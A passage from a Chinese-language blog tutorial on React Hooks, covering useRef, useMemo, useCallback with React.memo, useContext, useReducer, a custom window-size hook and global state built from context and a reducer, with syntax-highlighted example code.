返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。通过 current 属性可以访问到 DOM 节点</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">TextInputWithFocusButton</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> inputEl = useRef(<span class=\"literal\">null</span>);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> onButtonClick = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    inputEl.current.focus(); <span class=\"comment\">// `current` 指向已挂载到 DOM 上的文本输入元素</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;&gt;</span><br><span class=\"line\">      &lt;input ref=&#123;inputEl&#125; type=<span class=\"string\">&quot;text&quot;</span> /&gt;</span><br><span class=\"line\">      &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;/button&gt;</span><br><span class=\"line\">    &lt;/&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取上一轮的 props 或 state</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">usePrevious</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> ref = useRef(); <span class=\"comment\">// 此处的 ref 相当于是全局变量，re-render 时并不会被回收</span></span><br><span class=\"line\">  useEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    ref.current = value;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ref.current;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"4-useMemo\"><a href=\"#4-useMemo\" class=\"headerlink\" title=\"4.useMemo\"></a>4.useMemo</h2><p>用于缓存值，避免在每次渲染时都进行高开销的计算</p>\n<p><code>const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]);</code></p>\n<p>用于缓存值，把 “创建” 函数和依赖项数组作为参数传入 <code>useMemo</code>，它仅会在某个依赖项改变时才重新计算 <code>memoized</code> 值。这种优化有助于避免在每次渲染时都进行高开销的计算。类似于 Vue 中的 <code>computed</code> 属性。</p>\n<blockquote>\n<p>函数组件里的某一个 state 变化时，都会重新执行整个函数并渲染，逻辑从上到下重新执行一遍</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">WithMemo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [val, setValue] = useState(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 缓存了昂贵的计算</span></span><br><span class=\"line\">\t<span class=\"keyword\">const</span> expensive = useMemo(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;compute&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; count * <span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">\t\t\tsum += i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">\t&#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (</span><br><span class=\"line\">\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t&lt;h4&gt;&#123;count&#125;-&#123;expensive&#125;&lt;/h4&gt;</span><br><span class=\"line\">\t\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> setCount(count + <span class=\"number\">1</span>)&#125;&gt;+c1&lt;<span class=\"regexp\">/button&gt;            &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125; /</span>&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-useCallback\"><a href=\"#5-useCallback\" class=\"headerlink\" title=\"5. useCallback\"></a>5. useCallback</h2><p><code>const memoizedCb = useMemo(() =&gt; doSomething(a, b), [a, b]);</code></p>\n<p>用于<strong>缓存函数</strong>，返回一个 memoized 回调函数，根据依赖项来决定是否更新函数</p>\n<p>在 class component 中通过 shouldComponentUpdate 或 getDerivedStateFromProps 中判断前后的 props 和 state，如果没有变化，则阻止更新，而 16.8 版本前的 function component 没有生命周期钩子用来优化性能，且函数组件每次调用都会执行其内部环境的所有逻辑，因此用 useMemo 和 useCallback 处理优化性能问题。</p>\n<blockquote>\n<p>把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。</p>\n</blockquote>\n<blockquote>\n<p>React.memo 为高阶组件。它与 React.PureComponent 非常相似，但只适用于函数组件，而不适用 class 组件，能对props做浅比较，防止组件无效的重复渲染</p>\n</blockquote>\n<p>有一个父组件，其中包含子组件，子组件接收一个函数作为 props；通常而言，如果父组件更新了，子组件也会执行更新；但是大多数场景下，更新是没有必要的，我们可以借助useCallback来返回函数，然后把这个函数作为props传递给子组件；这样，子组件就能避免不必要的更新。</p>\n<p>例如：父组件传递一个函数给子组件的时候，由于父组件的更新会导致该函数重新生成从而传递给子组件的函数引用发生了变化，这就会导致子组件也会更新，而很多时候子组件的更新是没必要的，所以我们可以通过 <code>useCallback</code> 来缓存该函数，然后传递给子组件，用于减少子组件不必要的重新渲染。</p>\n<p><strong>note:</strong> useCallback 需与 memo 结合使用，否则没有意义</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">useFetch</span>(<span class=\"params\">count, step</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> url = <span class=\"string\">&quot;https://v/search?query=&quot;</span> + count + <span class=\"string\">&quot;&amp;step=&quot;</span> + step;</span><br><span class=\"line\">  &#125;, [count, step]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 父组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Parent = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [val, setVal] = useState(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> callback = useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> count;</span><br><span class=\"line\">\t&#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (</span><br><span class=\"line\">\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t&lt;h4&gt;&#123;count&#125;&lt;/h4&gt;</span><br><span class=\"line\">\t\t\t&lt;Child callback=&#123;callback&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> setCount(count + <span class=\"number\">1</span>)&#125;&gt;+&lt;/button&gt;</span><br><span class=\"line\">\t\t\t\t&lt;input value=&#123;val&#125; onChange=&#123;<span class=\"function\"><span class=\"params\">event</span> =&gt;</span> setVal(event.target.value)&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 子组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Child = <span class=\"function\">(<span class=\"params\">&#123; callback &#125;</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"function\">() =&gt;</span> callback());</span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\tsetCount(callback());</span><br><span class=\"line\">\t&#125;, [callback]);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> React.memo(Child) <span class=\"comment\">// 用React.memo包裹</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-1-何时使用-useMemo、useCallback\"><a href=\"#5-1-何时使用-useMemo、useCallback\" class=\"headerlink\" title=\"5.1 何时使用 useMemo、useCallback\"></a>5.1 何时使用 useMemo、useCallback</h3><ul>\n<li>需要保持对象、函数的引用地址相等（核心）</li>\n<li>对于组件内部用到的 object、array、函数等，如果用在了其他 Hook 的依赖数组中，或者作为 props 传递给了下游组件，应该使用 useMemo 和 useCallback</li>\n<li>自定义 Hook 中暴露出来的 object、array、函数等，都应该使用useMemo 和 useCallback,以确保当值相同时，引用不发生变化</li>\n</ul>\n<p>React.memo 和 React.PureComponent 类似， React.PureComponent 在类组件中使用，而 React.memo 在函数组件中使用</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 父组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Parent = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [val, setVal] = useState(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> callback = useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> count;</span><br><span class=\"line\">\t&#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (</span><br><span class=\"line\">\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t&lt;h4&gt;&#123;count&#125;&lt;/h4&gt;</span><br><span class=\"line\">\t\t\t&lt;Child callback=&#123;callback&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> setCount(count + <span class=\"number\">1</span>)&#125;&gt;+&lt;/button&gt;</span><br><span class=\"line\">\t\t\t\t&lt;input value=&#123;val&#125; onChange=&#123;<span class=\"function\"><span class=\"params\">event</span> =&gt;</span> setVal(event.target.value)&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 子组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Child = <span class=\"function\">(<span class=\"params\">&#123; callback &#125;</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"function\">() =&gt;</span> callback());</span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\tsetCount(callback());</span><br><span class=\"line\">\t&#125;, [callback]);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> React.memo(Child)</span><br><span class=\"line\">\t<span class=\"comment\">// 用React.memo包裹</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"6-useContext\"><a href=\"#6-useContext\" class=\"headerlink\" title=\"6. useContext\"></a>6. useContext</h2><p>接收一个 <code>context</code> 对象（React.createContext 的返回值）并返回该 context 的当前值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// initContext 可以为基础数据类型、对象或者函数</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> context = React.useContext(React.createContext(initContext))</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>当前的 context 值由上层组件中距离当前组件最近的 <code>&lt;MyContext.Provider&gt;</code> 的 <code>value</code> <strong>prop</strong> 决定，如果 <code>&lt;MyContext.Provider&gt;</code> 没有提供 <code>value</code> <strong>prop</strong>，则 <code>context</code> 中获取到的值为 <code>React.createContext(initContext)</code> 中的 <code>initContext</code> 值</p>\n</blockquote>\n<blockquote>\n<p>当 <code>&lt;MyContext.Provider&gt;</code> 更新时，该 Hook 会触发重渲染，并使用最新传递给 <code>MyContext provider</code> 的 <code>context</code> <strong>value</strong> 值</p>\n</blockquote>\n<h2 id=\"7-useReducer\"><a href=\"#7-useReducer\" class=\"headerlink\" title=\"7. useReducer\"></a>7. useReducer</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [state, dispatch] = useReducer(reducer, initialArg, init);</span><br></pre></td></tr></table></figure>\n\n<p>在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为你可以向子组件传递 dispatch 而不是回调函数 </p>\n<blockquote>\n<p>React 会确保 dispatch 函数的标识是稳定的，并且不会在组件重新渲染时改变。这就是为什么可以安全地从 useEffect 或 useCallback 的依赖列表中省略 dispatch</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> reducer =<span class=\"function\">(<span class=\"params\">state = <span class=\"number\">0</span>, &#123;type&#125;</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;add&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;delete&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state-<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> Hook =<span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count, dispatch] = useReducer(reducer, <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\">           count:&#123;count&#125;</span><br><span class=\"line\">           &lt;button onClick=&#123;<span class=\"function\">()=&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>:<span class=\"string\">&#x27;add&#x27;</span>&#125;)&#125;&gt;add&lt;/button&gt;</span><br><span class=\"line\">            &lt;button onClick=&#123;<span class=\"function\">()=&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>:<span class=\"string\">&#x27;delete&#x27;</span>&#125;)&#125;&gt;<span class=\"keyword\">delete</span>&lt;/button&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> Hook</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"8-自定义-hooks\"><a href=\"#8-自定义-hooks\" class=\"headerlink\" title=\"8. 自定义 hooks\"></a>8. 自定义 hooks</h2><p><strong>当触发 resize 事件时，自动更新 width、height</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; useEffect, useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> useWindowSize = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [width, setWidth] = useState()</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [height, setHeight] = useState()</span><br><span class=\"line\"></span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">const</span> &#123; clientWidth, clientHeight &#125; = <span class=\"built_in\">document</span>.documentElement</span><br><span class=\"line\">\t\tsetWidth(clientWidth)</span><br><span class=\"line\">\t\tsetHeight(clientHeight)</span><br><span class=\"line\">\t&#125;, [])</span><br><span class=\"line\"></span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">const</span> handleWindowSize = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">const</span> &#123; clientWidth, clientHeight &#125; = <span class=\"built_in\">document</span>.documentElement</span><br><span class=\"line\">\t\t\tsetWidth(clientWidth)</span><br><span class=\"line\">\t\t\tsetHeight(clientHeight)</span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">&#x27;resize&#x27;</span>, handleWindowSize, <span class=\"literal\">false</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">window</span>.removeEventListener(<span class=\"string\">&#x27;resize&#x27;</span>, handleWindowSize, <span class=\"literal\">false</span>)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &#123; width, height &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"9-全局状态管理（useContext-useReducer）\"><a href=\"#9-全局状态管理（useContext-useReducer）\" class=\"headerlink\" title=\"9. 全局状态管理（useContext + useReducer）\"></a>9. 全局状态管理（useContext + useReducer）</h2><ol>\n<li>定义 <code>reducer</code> 函数、初始 <code>state</code> 值，通过 <code>useReducer(reducer, state)</code> 生成 <code>state</code> 和 <code>dispatch</code></li>\n<li>父组件通过 <code>&lt;Context.Provider&gt;</code> 将 <code>state</code> 数据、<code>dispatch</code> 函数提供给 context</li>\n<li>子孙组件通过 <code>useContext()</code> 获取到 <code>state</code>、<code>dispatch</code></li>\n<li>子孙组件通过 <code>state</code> 数据绑定到 VNode、触发事件时调用 <code>dispatch</code> 函数</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// store.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; createContext, useContext, useReducer &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> StoreContext = createContext();</span><br><span class=\"line\"><span class=\"keyword\">const</span> initialState = &#123;<span class=\"attr\">count</span>: <span class=\"number\">0</span>, <span class=\"attr\">message</span>: <span class=\"string\">&#x27;&#125;;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">const reducer = (state, action) =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"string\">  switch(action.type) &#123;</span></span><br><span class=\"line\"><span class=\"string\">    case &#x27;</span>increment<span class=\"string\">&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">      return &#123;</span></span><br><span class=\"line\"><span class=\"string\">        count: state.count + 1,</span></span><br><span class=\"line\"><span class=\"string\">        message: action.message</span></span><br><span class=\"line\"><span class=\"string\">      &#125;</span></span><br><span class=\"line\"><span class=\"string\">    case &#x27;</span>decrement<span class=\"string\">&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">      return &#123;</span></span><br><span class=\"line\"><span class=\"string\">        count: state.count - 1,</span></span><br><span class=\"line\"><span class=\"string\">        message: action.message</span></span><br><span class=\"line\"><span class=\"string\">      &#125;</span></span><br><span class=\"line\"><span class=\"string\">      case &#x27;</span>reset<span class=\"string\">&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">        return &#123;</span></span><br><span class=\"line\"><span class=\"string\">          count: 0,</span></span><br><span class=\"line\"><span class=\"string\">          message: action.message</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    default:</span></span><br><span class=\"line\"><span class=\"string\">      throw new Error(`Unhandled action type: $&#123;action.type&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">  &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">export const StoreProvider = (&#123; children &#125;) =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"string\">  const [state, dispatch] = useReducer(reducer, initialState);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  return (</span></span><br><span class=\"line\"><span class=\"string\">    &lt;StoreContext.Provider value=&#123;&#123;state, dispatch&#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &#123;children&#125;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/StoreContext.Provider&gt;</span></span><br><span class=\"line\"><span class=\"string\">  )</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">export const useStore = () =&gt; useContext(StoreContext);</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 